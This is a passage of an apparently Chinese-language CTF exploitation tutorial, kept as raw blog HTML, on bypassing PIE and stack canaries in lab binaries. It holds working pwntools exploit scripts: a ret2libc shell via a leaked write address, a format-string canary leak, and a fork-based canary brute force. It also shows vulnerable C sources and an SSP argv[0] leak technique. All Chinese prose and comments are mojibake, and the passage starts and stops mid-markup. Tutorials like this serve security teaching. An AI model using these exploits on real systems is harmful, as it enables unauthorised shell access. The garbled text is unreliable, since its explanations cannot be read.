class="string">&#x27;main&#x27;</span>]<span class="comment">#è®¡ç®—ç›¸å¯¹åç§»</span></span><br><span class="line">vuln_func_addr = start_addr + elf.sym[<span class="string">&#x27;vuln_func&#x27;</span>]</span><br><span class="line">write_plt = start_addr + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = start_addr + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write plt: &quot;</span> + <span class="built_in">hex</span>(write_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write got: &quot;</span> + <span class="built_in">hex</span>(write_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]main addr: &quot;</span> + <span class="built_in">hex</span>(main_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]start addr: &quot;</span> + <span class="built_in">hex</span>(start_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]vuln func addr: &quot;</span> + <span class="built_in">hex</span>(vuln_func_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line">ebx = start_addr + <span class="number">0x2000</span><span class="comment"># é€šè¿‡ç›¸å¯¹åç§»åŠ ä¸ŠPIEç¼ºé™·æ‰€å¾—çš„åœ°å€è·å–åˆ°GOTè¡¨çš„åœ°å€</span></span><br><span class="line"><span class="comment">#è¿™è¾¹çš„0X2000çš„å€¼è¯·çœ‹ã€Šctfç«èµ›æƒå¨æŒ‡å—ï¼ˆPWNç¯‡ï¼‰ã€‹è¿™æœ¬ä¹¦çš„PIEè§£é‡Š</span></span><br><span class="line"><span class="comment">#0x699+0x1967=0x2000ï¼Œä¸ºä»€ä¹ˆè¿™æ ·åŠ å‘¢ï¼Ÿè¯·çœ‹ä¸Šé¢çš„PIEæŠ€æœ¯çš„ç¼ºé™·ï¼Œä»¥åŠä¸Šé¢é‚£å¼ æˆªå›¾åœˆèµ·æ¥çš„ä¸¤ä¸ªå€¼</span></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span>*<span class="number">132</span>).encode() + p32(ebx) + <span class="string">b&quot;AAAA&quot;</span> + p32(write_plt) + p32(vuln_func_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)<span class="comment">#æ ¹æ®__x86.get_pc.thunkçš„ç‰¹æ€§æ‹¼æ¥åœ°å€ï¼Œè¯¥ç‰¹æ€§å¤šäº†ä¸€æ­¥callæ“ä½œ</span></span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv())</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak write addr: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr=write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr+ libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">&quot;B&quot;</span> * <span class="number">140</span>).encode() + p32(system_addr) + p32(vuln_func_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/30.png" alt="image-20210326163537561"></p><blockquote><h2 id="ç»•è¿‡CANNARYä¿æŠ¤"><a href="#ç»•è¿‡CANNARYä¿æŠ¤" class="headerlink" title="ç»•è¿‡CANNARYä¿æŠ¤"></a>ç»•è¿‡CANNARYä¿æŠ¤</h2></blockquote><p>ä¿æŠ¤åŸç†å°±æ˜¯åœ¨ebpçš„ä½åœ°å€æ·»åŠ ä¸€ä¸ªéšå³å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">High           +-----------------+</span><br><span class="line"> |             |      args       |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |             | return address  |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |     ebp &#x3D;&gt;  |       ebp       |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |    ebp-4 &#x3D;&gt; |   canary value  |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> V             |     å±€éƒ¨å˜é‡     |</span><br><span class="line">Low            +-----------------+</span><br></pre></td></tr></table></figure><hr><h3 id="æ³„éœ²æ ˆä¸­çš„-Canary"><a href="#æ³„éœ²æ ˆä¸­çš„-Canary" class="headerlink" title="æ³„éœ²æ ˆä¸­çš„ Canary"></a>æ³„éœ²æ ˆä¸­çš„ Canary</h3><p>Canary è®¾è®¡ä¸ºä»¥å­—èŠ‚ <code>\x00</code> ç»“å°¾ï¼Œæœ¬æ„æ˜¯ä¸ºäº†ä¿è¯ Canary å¯ä»¥æˆªæ–­å­—ç¬¦ä¸²ã€‚ æ³„éœ²æ ˆä¸­çš„ Canary çš„æ€è·¯æ˜¯è¦†ç›– Canary çš„ä½å­—èŠ‚ï¼Œæ¥æ‰“å°å‡ºå‰©ä½™çš„ Canary éƒ¨åˆ†ã€‚ è¿™ç§åˆ©ç”¨æ–¹å¼éœ€è¦å­˜åœ¨åˆé€‚çš„è¾“å‡ºå‡½æ•°ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦ç¬¬ä¸€æº¢å‡ºæ³„éœ² Canaryï¼Œä¹‹åå†æ¬¡æº¢å‡ºæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚</p><h4 id="åˆ©ç”¨ç¤ºä¾‹"><a href="#åˆ©ç”¨ç¤ºä¾‹" class="headerlink" title="åˆ©ç”¨ç¤ºä¾‹"></a>åˆ©ç”¨ç¤ºä¾‹</h4><p>å­˜åœ¨æ¼æ´çš„ç¤ºä¾‹æºä»£ç å¦‚ä¸‹ï¼Œç¼–è¯‘ä¸º 32bit ç¨‹åºå¹¶å…³é—­ PIE ä¿æŠ¤ ï¼ˆé»˜è®¤å¼€å¯ NXï¼ŒASLRï¼ŒCanary ä¿æŠ¤ï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello Hacker!&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -no-pie test.c -o test3</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜åªéœ€è¦åˆ©ç”¨printå‡½æ•°çš„ä¿¡æ¯æ³„éœ²è·å–åˆ°canaryå€¼çš„åœ°å€å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_shell_func_addr = elf.sym[<span class="string">&#x27;getshell&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]get shell func addr: &quot;</span> + <span class="built_in">hex</span>(get_shell_func_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="comment">#åˆ©ç”¨ä¸¤æ¬¡forå¾ªç¯æ¥è·å–canary_valueçš„å€¼</span></span><br><span class="line"><span class="comment">#ç¬¬ä¸€æ¬¡åˆ©ç”¨æº¢å‡ºè·å–è¿”å›çš„å€¼ï¼Œç”±äºcanaryçš„ä¿æŠ¤æˆ‘ä»¬ä¸ä¼šè¦†ç›–åˆ°ebpï¼Œç¨‹åºå¯ä»¥è¿›è¡Œè¿è¡Œ</span></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span>*<span class="number">100</span>).encode()</span><br><span class="line">io.sendline(payload1)<span class="comment">#å¿…é¡»ä½¿ç”¨å¸¦&#x27;\n&#x27;çš„å€¼è¿›è¡Œpocç»“å°¾ï¼Œä¹Ÿå°±æ˜¯æ¨¡æ‹Ÿå›è½¦é”®</span></span><br><span class="line"><span class="comment">#è¾“å‡ºå¸¦æœ‰payload1å’Œcanaryæ··åˆçš„å€¼ï¼Œç”¨recvuntilæ¥æ¥æ”¶å¤„ç†</span></span><br><span class="line">recvuntil_value=io.recvuntil(payload1)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">b&quot;[*]recvuntil value: &quot;</span> + recvuntil_value)</span><br><span class="line">canary_value = u32(io.recv(<span class="number">4</span>))-<span class="number">0xa</span><span class="comment">#0xaæ˜¯\nçš„åå…­è¿›åˆ¶å€¼ï¼ŒASCIIè¡¨å¯¹åº”</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]canary value: &quot;</span> + <span class="built_in">hex</span>(canary_value))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]canary value add 0xa: &quot;</span> + <span class="built_in">hex</span>(canary_value+<span class="number">0xa</span>))</span><br><span class="line">payload2 = (<span class="string">&quot;A&quot;</span>*<span class="number">100</span>).encode()+p32(canary_value)+(<span class="string">&quot;A&quot;</span>*<span class="number">12</span>).encode()+p32(get_shell_func_addr)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="çˆ†ç ´Canaryå€¼"><a href="#çˆ†ç ´Canaryå€¼" class="headerlink" title="çˆ†ç ´Canaryå€¼"></a>çˆ†ç ´Canaryå€¼</h3><p>æ¯æ¬¡è¿›ç¨‹é‡å¯åçš„canaryä¸åŒï¼Œä¸”åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„æ¯ä¸ªçº¿ç¨‹çš„canaryä¹Ÿä¸åŒã€‚ä½†æ˜¯å¦‚æœç¨‹åºé€šè¿‡forkå‡½æ•°å¼€å¯å­è¿›ç¨‹äº¤äº’çš„è¯ï¼Œforkå‡½æ•°ä¼šç›´æ¥æ‹·è´çˆ¶è¿›ç¨‹çš„å†…å­˜ï¼Œå› æ­¤æ¯æ¬¡åˆ›å»ºçš„å­è¿›ç¨‹çš„canaryæ˜¯ç›¸åŒçš„ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™æ ·çš„ç‰¹ç‚¹ï¼Œé€ä¸ªå­—èŠ‚å°†canaryçˆ†ç ´å‡ºæ¥ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    fgets(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">fun();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">wait(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc -m32 -no-pie test.c -o test4</span></span><br><span class="line"><span class="comment">//echo &quot;hello wrod by ascotbe&quot; &gt; flag</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æºç é‡Œé¢æº¢å‡ºç‚¹æ˜¯100ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”è¿è¡Œç¨‹åºå¦‚æœä¸€ç›´æŒ‰å›è½¦ä¼šå¯åŠ¨Nä¸ªè¿›ç¨‹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/31.png" alt="image-20210401114355036"></p><p>å› ä¸ºcanaryçš„Â æœ€åçš„ä¸€ä¸ªå­—èŠ‚æ€»æ˜¯<strong>0x00</strong>ï¼ˆä¸ºäº†æˆªæ–­æ•°æ®ï¼Œå°ç«¯æ’åºï¼‰ï¼Œæ‰€ä»¥åªéœ€è¦çˆ†ç ´å‰©ä¸‹çš„ä¸‰ä¸ªå­—èŠ‚å°±å¯ä»¥äº†ï¼Œæ¯æ¬¡å°è¯•ä¸€ä¸ªå­—èŠ‚ï¼Œå¦‚æœç¨‹åºé¡ºåˆ©æ‰§è¡Œå¾—åˆ°ç»“æœ<code>welcome\n</code>ï¼Œå¦åˆ™ç¨‹åºå´©æºƒï¼Œé€šè¿‡ç©·ä¸¾å°±èƒ½çˆ†ç ´å¤„æ­£ç¡®çš„canaryå€¼ã€‚64ä½çš„è¯çˆ†ç ´7ä½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test4&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_flag_func_addr = elf.sym[<span class="string">&#x27;getflag&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">test=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        io.send((<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>).encode()+ canary + <span class="built_in">bytes</span>([i]))<span class="comment">#intè½¬æ¢æˆbytesç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥è½¬æ¢ä¸º16è¿›åˆ¶çš„</span></span><br><span class="line">        a = io.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;recv&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += <span class="built_in">bytes</span>([i])</span><br><span class="line">            print(<span class="string">b&quot;[*] Blasting out byte :&quot;</span>+canary)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">print(<span class="string">b&quot;[*] canary is :&quot;</span>+canary)</span><br><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>).encode() + canary+ (<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>).encode() + p32(get_flag_func_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">flag = io.recv()</span><br><span class="line">io.close()</span><br><span class="line">log.success(<span class="string">&quot;flag is:&quot;</span> + flag.decode())</span><br></pre></td></tr></table></figure><p><del>å¼±ç±»å‹è¯­è¨€ç±»å‹è½¬æ¢çœŸçš„æœ‰ç‚¹æ¶å¿ƒ</del></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/32.png" alt="image-20210401173411704"></p><h3 id="SSPï¼ˆStack-Smashing-Protector-ï¼‰"><a href="#SSPï¼ˆStack-Smashing-Protector-ï¼‰" class="headerlink" title="SSPï¼ˆStack Smashing Protector ï¼‰"></a>SSPï¼ˆStack Smashing Protector ï¼‰</h3><p>åˆ©ç”¨åŸç†æ˜¯Canaryå€¼è¢«ä¿®æ”¹ç„¶åå‡½æ•°ä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œä¼š<code>call __stack_chk_fail</code>æ‰“å°**argv[0]**è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œé»˜è®¤æ˜¯ç¨‹åºçš„åå­—ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬æŠŠå®ƒè¦†ç›–ä¸ºflagçš„åœ°å€æ—¶ï¼Œå®ƒå°±ä¼šæŠŠflagç»™æ‰“å°å‡ºæ¥ï¼Œæ³¨æ„ä¸è¦ç”¨åŸæ¥flagçš„åœ°å€è¦†ç›–ï¼Œå› ä¸ºåŸæ¥å­˜å‚¨flagçš„åœ°å€ä¼šè¢«overwriteï¼Œä½†æ˜¯ç”±äºELFçš„æ˜ å°„æ–¹å¼ï¼Œæ­¤flagä¼šè¢«æ˜ å°„ä¸¤æ¬¡ï¼Œå¦ä¸€ä¸ªåœ°æ–¹çš„flagçš„å†…å®¹ä¸ä¼šå˜ï¼ŒåŸå› æ˜¯<code>__stack_chk_fail</code>ä¼šè°ƒç”¨<strong>libc_message</strong></p><p><a href="https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229">é¢˜ç›®åœ°å€</a>    <a href="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/smashes">å¤‡ç”¨åœ°å€</a></p><p>æˆ‘ä»¬ä½¿ç”¨IDAæŸ¥çœ‹ä¸€ä¸‹ä»£ç ï¼Œå¯ä»¥å‘ç°æº¢å‡ºç‚¹åœ¨ä¸‹é¢è¿™æ®µä»£ç ä¸­çš„<code>_IO_getc</code>å‡½æ•°ä¸­</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  byte_600D20[v0++] = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒå‡»<code>byte_600D20</code>å¯ä»¥çœ‹åˆ°è¿™æ ·çš„ç”»é¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600D20 ; char byte_600D20[]</span><br><span class="line">.data:0000000000600D20 byte_600D20     db 50h                  ; DATA XREF: sub_4007E0+6Eâ†‘w</span><br><span class="line">.data:0000000000600D21 aCtfHereSTheFla db &#39;CTF&#123;Here&#39;,27h,&#39;s the flag on server&#125;&#39;,0</span><br><span class="line">.data:0000000000600D21 _data           ends</span><br></pre></td></tr></table></figure><p>ç”±æ­¤å¯çŸ¥ï¼ŒæœåŠ¡å™¨ç«¯ä¸­çš„ flag åº”è¯¥ä¹Ÿåœ¨è¿™ä¸ªä½ç½®ä¸Šã€‚æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ä¸‹ä¸ªæ–­ç‚¹æ¥è¿›å…¥mainå‡½æ•°ï¼Œä½†æ˜¯ç”±äºç¨‹åºç»è¿‡äº†stripå¤„ç†ï¼Œæ²¡æœ‰debugä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸‹æ–­ç‚¹åˆ°<code>__libc_start_main</code>å‡½æ•°æ‰èƒ½çœ‹åˆ°ï¼Œå¯ä»¥çœ‹åˆ°RDIçš„å€¼æ‰æ˜¯mainå‡½æ•°çš„çœŸæ­£å…¥å£</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/33.png" alt="image-20210402134315830"></p><p><strong>0x7fffffffe269</strong>æŒ‡å‘ç¨‹åºåï¼Œå…¶è‡ªç„¶å°±æ˜¯argv[0]ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹çš„å†…å®¹å°±æ˜¯è¿™ä¸ªåœ°å€ã€‚<br>åŒæ—¶<strong>0x7fffffffded8</strong>å¤„ä¿ç•™ç€è¯¥åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬çœŸæ­£éœ€è¦çš„åœ°å€æ˜¯<strong>0x7fffffffded8</strong></p><p>æ¥ç€æˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ 